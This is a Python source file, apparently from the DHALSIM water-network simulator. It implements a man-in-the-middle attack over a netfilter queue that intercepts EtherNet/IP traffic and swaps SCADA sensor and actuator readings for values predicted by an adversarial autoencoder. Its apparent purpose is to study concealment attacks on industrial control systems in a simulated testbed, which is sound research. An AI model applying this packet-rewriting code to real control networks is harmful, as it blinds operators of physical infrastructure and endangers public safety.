from dhalsim.network_attacks.mitm_netfilter_queue_subprocess import PacketQueue
import argparse
from pathlib import Path

import os
import sys

import pandas as pd
import numpy as np

from scapy.layers.inet import IP, TCP
from scapy.packet import Raw

from dhalsim.network_attacks.utilities import translate_payload_to_float, translate_float_to_payload

from tensorflow.keras.callbacks import EarlyStopping, ModelCheckpoint
from tensorflow.keras.layers import *
from tensorflow.keras.models import *
from tensorflow.keras import optimizers
from tensorflow.keras.callbacks import *
from tensorflow import keras
                                                
# sklearn
from sklearn.model_selection import train_test_split
from sklearn.metrics import mean_squared_error
from sklearn.metrics import accuracy_score, f1_score, roc_curve, auc, precision_score, confusion_matrix, recall_score
from sklearn.preprocessing import MinMaxScaler

from concealment_ae_model import ConcealmentAE

import threading
import signal
import math 
import glob

class Error(Exception):
    """Base class for exceptions in this module."""


class ConcealmentError(Error):
    """Raised when there is an error in the concealment parameter"""


class UnconstrainedBlackBoxMiTMNetfilterQueue(PacketQueue):

    """ Time in seconds to check attack sync flags"""
    FLAG_SYNC_UPDATE_TIME = 0.1

    def __init__(self,  intermediate_yaml_path: Path, yaml_index: int, queue_number: int ):
        super().__init__(intermediate_yaml_path, yaml_index, queue_number)

        # set with all the tags received by SCADA
        self.scada_tags = self.get_scada_tags()

        # We can use the same method, as initially the df will be initialized with 0 values
        self.calculated_concealment_values_df = self.set_initial_conditions_of_scada_values()

        # Previous concealed values, for when we get nan values
        self.previous_calculated_values_dict = dict.fromkeys(self.scada_tags, 0.0)

        # Initialize input values
        self.received_scada_tags_df = self.calculated_concealment_values_df.copy(deep=True)
        
        # set with the tags we have not received in this iteration
        self.missing_received_scada_tags = self.scada_tags.copy()
        self.missing_sent_scada_tags = self.scada_tags.copy()
        self.predicted_for_iteration = False
        self.ok_to_conceal = False

        self.lock = threading.Lock()

        self.scada_values = []
        self.scada_session_ids = []

        # toDo: This will be something configured in the YAML file
        file_expr = 'training_data/ctown/'

        # Adversarial model for concealment
        self.advAE = ConcealmentAE(self.scada_tags)
        ctown_model = Path(__file__).parent/'adversarial_models/ctown_generator_100_percent'
        scaler_path = Path(__file__).parent/'adversarial_models/ctown_attacker_scaler.gz'
        
        try:
            # For now, only c-town is supported    
            self.advAE.generator = load_model(str(ctown_model))
            self.advAE.load_scaler(scaler_path)
            self.logger.debug('Trained model found')

        except FileNotFoundError:
            self.logger.info('No trained model found, training...')
            self.advAE.train_model(file_expr)
            self.logger.info('Model trained')
            self.advAE.save_model(ctown_model, scaler_path)
            self.logger.info('Model saved')

        except IOError:
            self.logger.info('No trained model found, training...')
            self.advAE.train_model(file_expr)
            self.logger.info('Model trained')
            self.advAE.save_model(ctown_model, scaler_path)
            self.logger.info('Model saved')

        self.sync_flag = True
        self.sync_thread = threading.Thread(target=self.handle_sync)
        self.sync_thread.start()

    def interrupt(self):
        self.sync_flag = False
        self.logger.debug("Netfilter process interrupted")

    def sigint_handler(self, sig, frame):
        """Interrupt handler for attacker being stoped"""
        self.logger.debug("Printing concealment values")
        conc_path = Path(__file__).parent.absolute() / "concealed_values.csv"
        self.calculated_concealment_values_df.to_csv(conc_path, index=False)
        self.logger.debug("Netfilter queue process shutting down")
        self.interrupt()

    def handle_sync(self):
        while self.sync_flag:
            # flag = 0 means a physical process finished a new iteration
            while (not self.get_sync(0)) and self.sync_flag:
                pass

            # We have to keep the same state machine as PLCs
            self.set_sync(1)

            # 2 is when the PLCs exchange locally their information
            while not self.get_sync(2):
                pass

            # This is the space to handle the concealment finite state machine
            # Two States: 
            #    1) Receiving SCADA tags. Not predicted concealed values. Stay in this state until missing_received_scada_tags is empty. 
            #       Transitioning from 1 to 2 means calling the predict concealment values method. Then predicted = True  and reset missing_sent_scada
            #    2) Sending SCADA tags. Predicted. Stay in this state until missing_sent_scada_tags is empty.
            #    Restart: reset missing_received_scada, missing_sent_scada. predicted = False
            # self.logger.debug('Sync is 2. Keeping attack sync in 2, until we get all SCADA flags')

            # Check if we need to conceal
            if self.intermediate_attack['trigger']['start'] <= int(self.get_master_clock()) < \
                    self.intermediate_attack['trigger']['end']:
                # self.logger.debug('Adversarial Model initialized and ready to conceal')
                self.ok_to_conceal = True
            else:
                self.ok_to_conceal = False

            if self.ok_to_conceal:
                # State 1)
                # Reset state            
                with self.lock:
                    self.missing_received_scada_tags = self.scada_tags.copy()
                    self.predicted_for_iteration = False             

                while self.missing_received_scada_tags and self.sync_flag:            
                    pass

                # Transition from 1) to 2)
                self.predict_concealment_values()
                with self.lock:
                    self.missing_sent_scada_tags = self.scada_tags.copy()
                    self.predicted_for_iteration = True                
                self.logger.debug('Concealment values predicted')                

                # State 2)
                while self.missing_sent_scada_tags and self.sync_flag:
                    pass

            # self.logger.debug('Setting attack sync in 3')
            self.set_sync(3)

        self.logger.debug('Netfilter sync thread while finished')

    def handle_concealment(self, session, ip_payload):
        if self.ok_to_conceal: 
            if self.predicted_for_iteration == True:
                if self.missing_sent_scada_tags:
                    if session['tag'] in self.missing_sent_scada_tags:
                        self.missing_sent_scada_tags.remove(session['tag'])

                if math.isnan(self.calculated_concealment_values_df.iloc[0][session['tag']]):
                    if not (math.isnan(self.previous_calculated_values_dict[session['tag']])):
                        self.logger.debug(f"Using previous value: {self.previous_calculated_values_dict[session['tag']]}") 
                        concealed_value = translate_float_to_payload(self.previous_calculated_values_dict[session['tag']] , ip_payload[Raw].load)
                        self.logger.debug(f"Sending previous concealed value") 
                        return concealed_value, True            
                    else:
                        self.logger.debug(f"Value of tag {session['tag']} is nan for this iteration") 
                        return ip_payload[Raw].load, False            
                else:
                    # self.logger.debug(f"Tag {session['tag']}")     
                    # self.logger.debug(f"Value concealed {self.calculated_concealment_values_df.iloc[0][session['tag']]}")
                    self.previous_calculated_values_dict[session['tag']] = self.calculated_concealment_values_df.iloc[0][session['tag']]
                    concealed_value = translate_float_to_payload(self.calculated_concealment_values_df.iloc[0][session['tag']], ip_payload[Raw].load)                                                 
                    return concealed_value, True            

            else:
                if self.missing_received_scada_tags:        
                    if session['tag'] in self.missing_received_scada_tags:                                            
                        self.missing_received_scada_tags.remove(session['tag'])
                    self.process_tag_in_missing(session, ip_payload)

                # Return not modified value        
                return ip_payload[Raw].load, False
        else:
            # Concealment inactive            
            # Return not modified value        
            return ip_payload[Raw].load, False

    def set_initial_conditions_of_scada_values(self):
        df = pd.DataFrame(columns=self.scada_tags)
        return df

    def get_scada_tags(self):
        aux_scada_tags = []
        for PLC in self.intermediate_yaml['plcs']:

            # We were having ordering issues by adding it as a set. Probably could be done in a more pythonic way
            if 'sensors' in PLC:
                    for sensor in PLC['sensors']:
                        if sensor not in aux_scada_tags:
                            aux_scada_tags.append(sensor)
                            
            if 'actuators' in PLC:
                    for actuator in PLC['actuators']:
                        if actuator not in aux_scada_tags:
                            aux_scada_tags.append(actuator)

        return aux_scada_tags

    # Delivers a pandas dataframe with ALL SCADA tags
    def predict_concealment_values(self):
        input_tags = self.received_scada_tags_df.iloc[-1:]
        nan_tags = input_tags.columns[input_tags.isna().any()].tolist()
        self.logger.debug(f'Tags with nan values: {nan_tags}')

        if nan_tags:
            input_tags = self.fix_nan_values_in_scada(input_tags, nan_tags) 
        
        fixed_input_nan_tags = input_tags.columns[input_tags.isna().any()].tolist()
        #self.logger.debug(f'Fixed Tags with nan values: {fixed_input_nan_tags}')

        self.calculated_concealment_values_df = self.advAE.predict(input_tags)
        self.last_clock_predicted = int(self.get_master_clock())
        # self.logger.debug('Predicted at iteration ' + str(self.last_clock_predicted))
        
    def fix_nan_values_in_scada(self, scada_df, nan_tags):
        last_index_list = []
        for tag in nan_tags:
            last_index_list.append(self.received_scada_tags_df[tag].last_valid_index())

        min_last_index = np.min(last_index_list)
        self.logger.debug(f"Last valid index is {min_last_index} for tag {tag}")
        for tag in scada_df:
            if min_last_index:                  
                #self.logger.debug("Replacing value")      
                #self.logger.debug(f"{self.received_scada_tags_df[tag]}")

                #self.logger.debug("Attempt")
                #self.logger.debug(f"{self.received_scada_tags_df.loc[last_index, tag]}")
                # Replace entire row with previous values
                scada_df.iloc[0][tag] = self.received_scada_tags_df.loc[min_last_index, tag]
            else:
                # no valid index found
                scada_df.iloc[0][tag] = 0   
        return scada_df

    def process_tag_in_missing(self, session, ip_payload):
        current_clock = int(self.get_master_clock())
        # We store the value, this df is an input for the concealment ML model
        self.received_scada_tags_df.loc[current_clock, session['tag']] = translate_payload_to_float(ip_payload[Raw].load)
                
    def handle_enip_response(self, ip_payload):
        this_session = int.from_bytes(ip_payload[Raw].load[4:8], sys.byteorder)
        this_context = int.from_bytes(ip_payload[Raw].load[12:20], sys.byteorder)
        
        # Concealment values to SCADA
        for session in self.scada_session_ids:
            if session['session'] == this_session and session['context'] == this_context:
                try:                    
                    value, modified = self.handle_concealment(session, ip_payload)                    
                except Exception as exc:
                    self.logger.debug(f'Exception in handle_enip_response: {exc}' )                
                    return ip_payload, False
                if modified:              
                    # self.logger.debug(f"Concealed value : {value}")                        
                    # self.logger.debug(f"Concealing tag : {session['tag']}")
                    return value, modified
        return ip_payload, False

    def handle_enip_request(self, ip_payload):

        # For this concealment, the only valid target is SCADA        
        this_session = int.from_bytes(ip_payload[Raw].load[4:8], sys.byteorder)        
        tag_name = ip_payload[Raw].load.decode(encoding='latin-1')[54:60].split(':')[0]
        context = int.from_bytes(ip_payload[Raw].load[12:20], sys.byteorder)
        session_dict = {'session': this_session, 'tag': tag_name, 'context': context}
        self.scada_session_ids.append(session_dict)

    def capture(self, packet):
        """
        This function is the function that will run in the thread started in the setup function.

        For every packet that enters the netfilterqueue, it will check its length. If the length is
        in between 102, we are dealing with a CIP packet. We then change the payload of that
        packet and delete the original checksum.
        :param packet: The captured packet.
        """

        try:
            p = IP(packet.get_payload())            
            if 'TCP' in p:
                if len(p) == 102:
                    p[Raw].load, modified = self.handle_enip_response(p)
                    if modified:
                        del p[IP].chksum
                        del p[TCP].chksum
                        packet.set_payload(bytes(p))
                        # self.logger.debug(f'Packet from ip {p[IP].src} to {p[IP].dst} modified and accepted')
                    packet.accept()
                    return
                else:
                    if len(p) == 118 or len(p) == 116 or len(p) == 120:
                        self.handle_enip_request(p)
                    else:
                        packet.accept()
                        return

            packet.accept()

        except Exception as exc:
            print(exc)
            if self.nfqueue:
                self.nfqueue.unbind()
            sys.exit(0)


    def get_sync(self, flag):
        """
        Get the sync flag of this plc.
        On a :code:`sqlite3.OperationalError` it will retry with a max of :code:`DB_TRIES` tries.
        Before it reties, it will sleep for :code:`DB_SLEEP_TIME` seconds.

        :return: False if physical process wants the plc to do a iteration, True if not.

        :raise DatabaseError: When a :code:`sqlite3.OperationalError` is still raised after
           :code:`DB_TRIES` tries.
        """
        res = self.db_query("SELECT flag FROM sync WHERE name IS ?", False, (self.intermediate_attack["name"],))
        return res == flag

    def set_sync(self, flag):
        """
        Set this plcs sync flag in the sync table. When this is 1, the physical process
        knows this plc finished the requested iteration.
        On a :code:`sqlite3.OperationalError` it will retry with a max of :code:`DB_TRIES` tries.
        Before it reties, it will sleep for :code:`DB_SLEEP_TIME` seconds.

        :param flag: True for sync to 1, False for sync to 0
        :type flag: bool

        :raise DatabaseError: When a :code:`sqlite3.OperationalError` is still raised after
           :code:`DB_TRIES` tries.
        """
        self.db_query("UPDATE sync SET flag=? WHERE name IS ?", True, (int(flag), self.intermediate_attack["name"],))

    def set_attack_flag(self, flag):
        """
        Set a flag in the attack table. When it is 1, we know that the attack with the
        provided name is currently running. When it is 0, it is not.

        :param flag: True for running to 1, false for running to 0
        """
        self.db_query("UPDATE attack SET flag=? WHERE name IS ?", True, (int(flag), self.intermediate_attack['name']))

def is_valid_file(parser_instance, arg):
    """Verifies whether the intermediate yaml path is valid."""
    if not os.path.exists(arg):
        parser_instance.error(arg + " does not exist")
    else:
        return arg

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Start everything for an attack')
    parser.add_argument(dest="intermediate_yaml",
                        help="intermediate yaml file", metavar="FILE",
                        type=lambda x: is_valid_file(parser, x))
    parser.add_argument(dest="index", help="Index of the network attack in intermediate yaml",
                        type=int,
                        metavar="N")
    parser.add_argument(dest="number", help="Number of que queue configured in IP Tables",
                        type=int,
                        metavar="N")

    args = parser.parse_args()

    attack = UnconstrainedBlackBoxMiTMNetfilterQueue(
        intermediate_yaml_path=Path(args.intermediate_yaml),
        yaml_index=args.index,
        queue_number=args.number)
    attack.main_loop()

